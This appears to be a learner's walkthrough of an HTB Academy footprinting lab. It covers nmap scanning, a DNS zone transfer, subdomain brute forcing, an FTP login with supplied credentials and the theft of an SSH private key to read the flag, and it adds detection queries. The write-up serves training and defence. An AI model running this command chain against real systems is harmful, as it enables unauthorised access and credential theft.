# Footprinting Lab — Easy
**HTB Academy** | **CPTS Module 04 — Footprinting**
**Completed:** March 2026 | **Author:** Jay Patel

## Lab Scenario

One credential set was provided as a starting point: `ceil:qwer1234` —
representing a realistic pentest scenario where credentials were already
obtained through prior recon such as phishing or OSINT. The goal is to use
service enumeration to discover where those credentials apply and pivot to
the flag.

## Attack Chain Overview

```
nmap → DNS AXFR → /etc/hosts → dnsenum → FTP port 2121 → SSH id_rsa → Flag
```

No single protocol gives the answer. Each step reveals what the next step
should be. This is how real-world footprinting chains work.

---

## Step 1 — Initial Nmap Scan

**Goal:** Discover all open services on the target before deciding where to attack.

```bash
nmap -A 10.129.141.200
```

**Flag breakdown:**
- `-A` — aggressive scan — enables version detection, OS detection, default
  NSE scripts, and traceroute in one flag

**Output:**
```
Hackerpatel007_1@htb[/htb]$ nmap -A 10.129.141.200

PORT     STATE SERVICE VERSION
21/tcp   open  ftp
|   220 ProFTPD Server (ftp.int.inlanefreight.htb) [10.129.141.200]
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
2121/tcp open  ftp
|   220 ProFTPD Server (Ceil's FTP) [10.129.141.200]
```

**What each service tells you:**

| Port | Service | Key Detail | Next Action |
|---|---|---|---|
| 21 | FTP ProFTPD | Banner leaks `ftp.int.inlanefreight.htb` | Note internal domain |
| 22 | SSH | OpenSSH 8.2p1 Ubuntu | Potential login target if key found |
| 53 | DNS BIND 9 | Full DNS server running | Attempt zone transfer immediately |
| 2121 | FTP ProFTPD | Banner says `Ceil's FTP` | Named after user `ceil` — matches given credentials |

Two FTP servers on different ports is unusual. Port 21 is the standard FTP,
port 2121 is a custom secondary FTP named after the user `ceil`. The FTP
banner on port 21 also leaks an internal hostname — always read banners
before doing anything else.

---

## Step 2 — DNS Zone Transfer

**Goal:** DNS is running on port 53 — attempt AXFR to dump all records and
discover internal hostnames.

```bash
dig AXFR inlanefreight.htb @10.129.141.200
```

**Output:**
```
Hackerpatel007_1@htb[/htb]$ dig AXFR inlanefreight.htb @10.129.141.200

inlanefreight.htb.          604800  IN  SOA   inlanefreight.htb. root.inlanefreight.htb.
inlanefreight.htb.          604800  IN  TXT   "v=spf1 ip4:10.129.124.8 ip4:10.129.127.2 ~all"
inlanefreight.htb.          604800  IN  NS    ns.inlanefreight.htb.
app.inlanefreight.htb.      604800  IN  A     10.129.18.15
internal.inlanefreight.htb. 604800  IN  A     10.129.1.6
mail1.inlanefreight.htb.    604800  IN  A     10.129.18.201
ns.inlanefreight.htb.       604800  IN  A     10.129.34.136
```

**Analysis:**

| Hostname | IP | Significance |
|---|---|---|
| `app.inlanefreight.htb` | 10.129.18.15 | Application server — generic |
| `internal.inlanefreight.htb` | 10.129.1.6 | Internal = private zone — investigate further |
| `mail1.inlanefreight.htb` | 10.129.18.201 | Mail server |
| `ns.inlanefreight.htb` | 10.129.34.136 | DNS nameserver |

`internal.inlanefreight.htb` stands out immediately — the word "internal"
signals a private subdomain that likely has its own DNS zone with more
hidden records. Always attempt AXFR on every discovered subdomain.

---

## Step 3 — Add internal.inlanefreight.htb to /etc/hosts

**Goal:** Make the local machine resolve the discovered hostname to the target IP.

```bash
sudo sh -c 'echo "10.129.141.200 internal.inlanefreight.htb" >> /etc/hosts'
```

`/etc/hosts` is the local DNS override — entries here take precedence over
any DNS resolver. The `>>` appends without overwriting. Never use `>` here —
it wipes the entire hosts file.

---

## Step 4 — Subdomain Brute Force With dnsenum

**Goal:** Brute force subdomains under `internal.inlanefreight.htb` to find
hidden internal hostnames.

```bash
dnsenum --dnsserver 10.129.141.200 --enum -p 0 -s 0 \
-f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
internal.inlanefreight.htb
```

**Flag breakdown:**
- `--dnsserver` — force all queries to the target DNS server
- `--enum` — full enumeration: NS, MX, AXFR attempts, brute force
- `-p 0 -s 0` — disable Google scraping (not available in lab environment)
- `-f` — wordlist of 5000 common subdomain names

**Output:**
```
Hackerpatel007_1@htb[/htb]$ dnsenum --dnsserver 10.129.141.200 --enum -p 0 -s 0 \
-f /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt \
internal.inlanefreight.htb

ftp.internal.inlanefreight.htb.   604800  IN  A   127.0.0.1
ns.internal.inlanefreight.htb.    604800  IN  A   10.129.34.13
```

`ftp.internal.inlanefreight.htb` is the critical discovery. The name `ftp`
directly indicates an FTP server — and combined with the `Ceil's FTP` banner
from port 2121 earlier, this is the target. It resolves to `127.0.0.1` in
DNS — a loopback address — meaning you reach it via the target machine's IP
directly. Add it to `/etc/hosts`.

---

## Step 5 — Add ftp.internal.inlanefreight.htb to /etc/hosts

```bash
sudo sh -c 'echo "10.129.141.200 ftp.internal.inlanefreight.htb" >> /etc/hosts'
```

**Verify with Nmap:**
```bash
nmap -T4 ftp.internal.inlanefreight.htb
```

**Output:**
```
Hackerpatel007_1@htb[/htb]$ nmap -T4 ftp.internal.inlanefreight.htb

PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
53/tcp   open  domain
2121/tcp open  ccproxy-ftp
```

Port 2121 is confirmed accessible via the internal hostname — this is
the custom Ceil's FTP server from Step 1.

---

## Step 6 — FTP Login on Port 2121

**Goal:** Use the provided credentials to log into the custom FTP server.

```bash
ftp ftp.internal.inlanefreight.htb 2121
```

**Login output:**
```
Hackerpatel007_1@htb[/htb]$ ftp ftp.internal.inlanefreight.htb 2121

Connected to ftp.internal.inlanefreight.htb.
220 ProFTPD Server (Ceil's FTP) [10.129.85.254]
Name: ceil
Password: qwer1234
230 User ceil logged in
```

Port number in the `ftp` command is specified as a second argument —
`ftp <host> <port>`. Different from most tools that use `-p`.

---

## Step 7 — Enumerate FTP and Download SSH Private Key

**Goal:** Find the SSH private key inside the FTP home directory.

```bash
ftp> ls -al
```

**Output:**
```
drwxr-xr-x  4 ceil ceil  4096 Nov 10 2021 .
drwxr-xr-x  4 ceil ceil  4096 Nov 10 2021 ..
-rw-------  1 ceil ceil   294 Nov 10 2021 .bash_history
-rw-r--r--  1 ceil ceil   220 Nov 10 2021 .bash_logout
-rw-r--r--  1 ceil ceil  3771 Nov 10 2021 .bashrc
drwx------  2 ceil ceil  4096 Nov 10 2021 .cache
-rw-r--r--  1 ceil ceil   807 Nov 10 2021 .profile
drwx------  2 ceil ceil  4096 Nov 10 2021 .ssh
-rw-------  1 ceil ceil   759 Nov 10 2021 .viminfo
```

`ls -al` — the `-a` flag reveals hidden dotfiles. Without it `ls` shows
nothing here because every interesting file starts with `.`. Always use
`ls -al` as the first FTP enumeration command.

**List .ssh directory:**
```bash
ftp> ls .ssh/
```

**Output:**
```
-rw-rw-r--  1 ceil ceil  738 Nov 10 2021 authorized_keys
-rw-------  1 ceil ceil 3381 Nov 10 2021 id_rsa
-rw-r--r--  1 ceil ceil  738 Nov 10 2021 id_rsa.pub
```

| File | Permissions | Purpose |
|---|---|---|
| `authorized_keys` | rw-rw-r-- | Public keys allowed to SSH in as ceil |
| `id_rsa` | rw------- | SSH private key — download this |
| `id_rsa.pub` | rw-r--r-- | Public key counterpart — not needed |

**Download the private key:**
```bash
ftp> cd .ssh
ftp> get id_rsa
```

**Output:**
```
200 PORT command successful
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
226 Transfer complete
3381 bytes received in 0.00 secs (2.6408 MB/s)
```

---

## Step 8 — Fix SSH Key Permissions

**Goal:** SSH refuses private keys with overly permissive permissions.

```bash
chmod 600 id_rsa
```

If `id_rsa` has permissions like `644`, SSH throws
`WARNING: UNPROTECTED PRIVATE KEY FILE!` and refuses to connect.
`600` means owner read/write only — nobody else.

| Permission | Octal | SSH Accepts? |
|---|---|---|
| `rw-------` | 600 | ✅ Yes — required |
| `rw-r--r--` | 644 | ❌ Too permissive |
| `rwxrwxrwx` | 777 | ❌ Rejected immediately |

---

## Step 9 — SSH Into Target and Read the Flag

```bash
ssh -i id_rsa ceil@10.129.141.200
```

**Output:**
```
Hackerpatel007_1@htb[/htb]$ ssh -i id_rsa ceil@10.129.141.200

The authenticity of host '10.129.141.200' can't be established.
ECDSA key fingerprint is SHA256:AelxWP/kQK76SQAaNbbaRFJ8vSmDBr/XB8/66aPreGs.
Are you sure you want to continue connecting (yes/no)? yes

Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)

ceil@NIXEASY:~$ cat /home/flag/flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```

---

## What I Learned / What Surprised Me

The chain of steps required to reach the flag was what made this lab
genuinely educational. No single service gave me the answer — the FTP
banner leaked a domain name, that led to a DNS zone transfer, which
revealed an internal subdomain, which required subdomain brute forcing,
which found the FTP server, which contained an SSH key. Each technique
fed the next. That chaining logic is exactly how real-world footprinting
engagements work — the value is not in any individual tool but in
recognising what each piece of information tells you to do next.

The `ls -al` lesson was also important. On first login I ran `ls` and
saw nothing. Adding `-a` revealed an entire `.ssh` directory with a
private key sitting there. That single flag change is the difference
between finding the path forward and thinking there is nothing there.

The DNS zone transfer working without any authentication was also a
reminder of how much information is freely given to anyone who asks
the right question. `dig AXFR` in two seconds returned the entire
internal network map for free.

---

## Detection Layer

| Attack Stage | MITRE Technique | Log Source | Detection Signal |
|---|---|---|---|
| DNS zone transfer | T1590.002 | DNS server logs | AXFR request from non-authorised IP |
| FTP enumeration | T1083 | FTP server logs | Directory listing + file download by authenticated user |
| SSH private key theft | T1552.004 | FTP + SSH logs | File download of id_rsa followed by SSH login with key auth |
| SSH login with key | T1078 | Auth.log Event | SSH login from new IP using key authentication |

**SPL Query to detect SSH key exfiltration via FTP:**
```spl
index=ftp_logs action=download filename="id_rsa"
| stats count by src_ip, user, filename
| sort -count
```

**KQL Query (Sentinel):**
```kql
CommonSecurityLog
| where DestinationPort == 2121 or DestinationPort == 21
| where Message contains "id_rsa"
| summarize Count=count() by SourceIP, DestinationIP, Message
| sort by Count desc
```

**MITRE Techniques:**
- T1590.002 — Gather Victim Network Information: DNS
- T1083 — File and Directory Discovery
- T1552.004 — Unsecured Credentials: Private Keys
- T1078 — Valid Accounts

---

## Full Attack Chain Reference

```
1.  nmap -A <IP>
    → FTP(21), SSH(22), DNS(53), FTP(2121)
    → Banner leaks ftp.int.inlanefreight.htb

2.  dig AXFR inlanefreight.htb @<IP>
    → Zone transfer succeeds
    → Discovers internal.inlanefreight.htb

3.  echo "<IP> internal.inlanefreight.htb" >> /etc/hosts

4.  dnsenum --dnsserver <IP> -f subdomains-top1million-5000.txt internal.inlanefreight.htb
    → Discovers ftp.internal.inlanefreight.htb

5.  echo "<IP> ftp.internal.inlanefreight.htb" >> /etc/hosts

6.  ftp ftp.internal.inlanefreight.htb 2121
    → Login: ceil:qwer1234

7.  ls -al → cd .ssh → get id_rsa

8.  chmod 600 id_rsa

9.  ssh -i id_rsa ceil@<IP>

10. cat /home/flag/flag.txt
    → HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}
```

---

## Commands Reference

| Command | Purpose |
|---|---|
| `nmap -A <IP>` | Full scan — version, OS, scripts, traceroute |
| `dig AXFR <domain> @<IP>` | DNS zone transfer attempt |
| `echo "<IP> <host>" >> /etc/hosts` | Add local DNS override |
| `dnsenum --dnsserver <IP> -f <wordlist> <domain>` | Subdomain brute force |
| `ftp <host> <port>` | FTP connection on non-standard port |
| `ftp> ls -al` | List all files including hidden dotfiles |
| `ftp> get id_rsa` | Download file from FTP |
| `chmod 600 id_rsa` | Fix SSH key permissions |
| `ssh -i id_rsa user@<IP>` | SSH with private key |
